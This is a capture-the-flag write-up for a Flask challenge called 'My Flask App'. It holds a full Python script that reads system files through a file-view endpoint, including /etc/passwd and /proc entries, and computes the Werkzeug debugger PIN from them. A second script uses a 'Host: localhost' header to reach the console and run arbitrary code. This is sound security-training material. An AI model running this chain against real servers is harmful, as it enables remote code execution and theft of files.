---
ai_date: 2025-08-17 20:46:28
ai_summary: Explored Flask vulnerabilities, found UID and route info, used SHA1 to
  compute PIN, and solved with 'Host' header bypass for console access
ai_tags:
- flask
- http-hdr
- ssrf
created: 2025-08-16T05:10
points: 100
solves: 457
title: My Flask App
updated: 2025-08-17T20:46
---

We get a free file leak, but I can't really find anything useful so I looked for hacks related to flask itself, I mean it has 100+ solves so it should be pretty easy.

A quick search brought me to https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html

I was quickly able to solve for the PIN and locally solve the challenge.

```python
import requests
import re
target = "http://localhost:5000"
target = "https://my-flask-app-psqkzfxd6bgu.chals.sekai.team:1337"

# /proc/self/status
Uid = requests.get(f"{target}/view?filename=/proc/self/status").text
Uid = Uid.split("Uid:")[1].split("\n")[0].strip().split()[0]
# /etc/passwd
passwd = requests.get(f"{target}/view?filename=/etc/passwd").text
# ...:x:UID:UID:
usernames = re.findall(r"^([^:]+):x:(\d+):(\d+):", passwd, re.MULTILINE)
username = next((u for u, uid, gid in usernames if uid == Uid), None)
if not username:
    print("Username not found for UID:", Uid)
    exit(1)

# make sure module file actually exists lol
module = '/usr/local/lib/python3.11/site-packages/flask/app.py'
module_file = requests.get(f"{target}/view?filename={module}").text
if "__future__" not in module_file:
    print("Module file does not exist")
    exit(1)

probably_public_bits = [username, 'flask.app', 'Flask', module]

# /proc/net/route
routes = requests.get(f"{target}/view?filename=/proc/net/route").text
routes = routes.splitlines()[1:]
# find destination 00000000
iface = next((line.split()[0] for line in routes if line.split()[1] == '00000000'), None)
if not iface:
    print("No route found for destination 00000000")
    exit(1)
# /sys/class/net/<iface>/address
address = requests.get(f"{target}/view?filename=/sys/class/net/{iface}/address").text.strip()
mac_addr = str(int(address.replace(':', ''), 16))

# /proc/sys/kernel/random/boot_id
mid = requests.get(f"{target}/view?filename=/proc/sys/kernel/random/boot_id").text.strip()

# /proc/self/cgroup
cgroup_part = requests.get(f"{target}/view?filename=/proc/self/cgroup").text.strip().rpartition('/')[2]

full_mid = mid + cgroup_part

private_bits = [mac_addr, full_mid]

### collection is done, now compute the PIN

import hashlib
from itertools import chain

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

# we also get the cookie name lol
cookie_name = '__wzd' + h.hexdigest()[:20]

h.update(b'pinsalt')
num = f"{int(h.hexdigest(), 16):09d}"[:9]
rv = None
for group_size in 5, 4, 3:
    if len(num) % group_size == 0:
        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size))
        break
else:
    rv = num
print(f"found pin: {rv}")
```

However trying to visit the remote's console failed.

Locally /console opens without issue but on remote it gives me bad request.

https://my-flask-app-psqkzfxd6bgu.chals.sekai.team:1337/console

```
Bad Request

The browser (or proxy) sent a request that this server could not understand.
```

I got stuck here for quite a bit, until the LLM overlords told me to use `Host=localhost` header, which magically solved the challenge lmfao.

```python

s = requests.Session()
secret = re.search(r"SECRET = \"(\w+)\";", s.get(f"{target}/console",headers={
    "Host": "localhost"
}).text).group(1)
print(s.get(f"{target}/console?__debugger__=yes&cmd=pinauth&pin={rv}&s={secret}",headers={
    "Host": "localhost"
}).text)

def run_code(code):
    return s.get(f"{target}/console?__debugger__=yes&cmd={requests.utils.quote(code)}&frm=0&s={secret}",headers={
    "Host": "localhost"
}).text

files = run_code(f"import os; print(os.listdir('/'))")
flag_file = re.search(r"flag-\S+.txt", files).group(0)
print(f"flag file: {flag_file}")
flag = run_code(f"with open('/{flag_file}', 'r') as f: print(f.read())")
flag = re.search(r"SEKAI{.*}", flag).group(0)
print(f"flag: {flag}")
# SEKAI{!$-tHIs-3ven_&lt;all3d_a_cv3}
# entity decoded -> SEKAI{!$-tHIs-3ven_<all3d_a_cv3}
```

```flag
SEKAI{!$-tHIs-3ven_<all3d_a_cv3}
```